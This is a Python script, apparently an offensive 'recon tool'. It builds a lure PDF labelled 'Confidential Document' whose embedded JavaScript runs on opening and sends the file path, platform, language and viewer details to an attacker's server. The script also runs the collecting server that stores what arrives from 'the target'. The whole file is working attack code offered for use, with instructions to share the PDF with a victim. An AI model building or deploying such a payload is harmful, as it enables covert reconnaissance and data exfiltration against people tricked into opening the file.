#!/usr/bin/env python3

import os
import platform
import socket
import json
from datetime import datetime
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

class DataCollectorHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        
        # Add timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        data['timestamp'] = timestamp
        
        # Print received data
        print("\n[+] Received data from target:")
        print(json.dumps(data, indent=2))
        
        # Save to file
        if not os.path.exists('collected_data'):
            os.makedirs('collected_data')
        filename = f"collected_data/data_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)
        print(f"\n[+] Data saved to: {filename}")
        
        # Send response
        self.send_response(200)
        self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Server is running")
    
    def log_message(self, format, *args):
        # Suppress default logging
        return

def start_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), DataCollectorHandler)
    print(f"[+] Server started on port {port}")
    print("[+] Waiting for incoming connections...")
    print("\n[+] Local URLs:")
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(f"http://{local_ip}:{port}")
    except:
        pass
    print(f"http://127.0.0.1:{port}")
    server.serve_forever()

def create_payload(server_url):
    """Create a PDF payload that sends system info when opened"""
    try:
        from PyPDF2 import PdfWriter, PdfReader
        from reportlab.pdfgen import canvas
        from reportlab.lib.pagesizes import letter
        import io
        
        print("[+] Creating PDF payload...")
        
        # Create output directory if it doesn't exist
        if not os.path.exists('payloads'):
            os.makedirs('payloads')
        
        # Create PDF content
        packet = io.BytesIO()
        c = canvas.Canvas(packet, pagesize=letter)
        c.setFont("Helvetica-Bold", 16)
        c.drawString(100, 750, "Confidential Document")
        c.setFont("Helvetica", 12)
        c.drawString(100, 700, "This document contains sensitive information.")
        c.drawString(100, 680, "Please wait while the document loads...")
        c.save()
        
        # Move to the beginning of the StringIO buffer
        packet.seek(0)
        new_pdf = PdfReader(packet)
        
        # Create a new PDF with the content
        writer = PdfWriter()
        page = writer.add_page(new_pdf.pages[0])
        
        # Add JavaScript to collect and send system information
        writer.add_js(f'''
        try {{
            app.alert("Loading document contents...");
            
            function collectAndSendData() {{
                var data = {{
                    "pdf_info": {{
                        "filename": this.documentFileName,
                        "title": this.title,
                        "path": this.path
                    }},
                    "system_info": {{
                        "platform": app.platform,
                        "language": app.language,
                        "viewer": app.viewerType,
                        "version": app.viewerVersion
                    }}
                }};
                
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "{server_url}", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(data));
            }}
            
            collectAndSendData();
        }} catch(e) {{
            console.log("Error:", e);
        }}
        ''')
        
        # Save the PDF
        output_pdf = os.path.join('payloads', 'document.pdf')
        with open(output_pdf, 'wb') as f:
            writer.write(f)
        
        print(f"[+] PDF payload created: {output_pdf}")
        print("[+] Share this file with the target")
        
        return output_pdf
    
    except Exception as e:
        print(f"[-] Error creating PDF payload: {str(e)}")
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("1. Start server: python recon_tool.py server [port]")
        print("2. Create payload: python recon_tool.py payload <server_url>")
        print("\nExample:")
        print("1. python recon_tool.py server 8080")
        print("2. python recon_tool.py payload http://your-ip:8080")
        sys.exit(1)
    
    command = sys.argv[1].lower()
    
    if command == "server":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
        try:
            start_server(port)
        except KeyboardInterrupt:
            print("\n[-] Server stopped")
        except Exception as e:
            print(f"[-] Error starting server: {str(e)}")
    
    elif command == "payload":
        if len(sys.argv) < 3:
            print("[-] Error: Server URL required")
            print("Example: python recon_tool.py payload http://your-ip:8080")
            sys.exit(1)
        server_url = sys.argv[2]
        create_payload(server_url)
    
    else:
        print("[-] Invalid command")
        print("Use 'server' to start server or 'payload' to create payload")
        sys.exit(1)

if __name__ == "__main__":
    main() 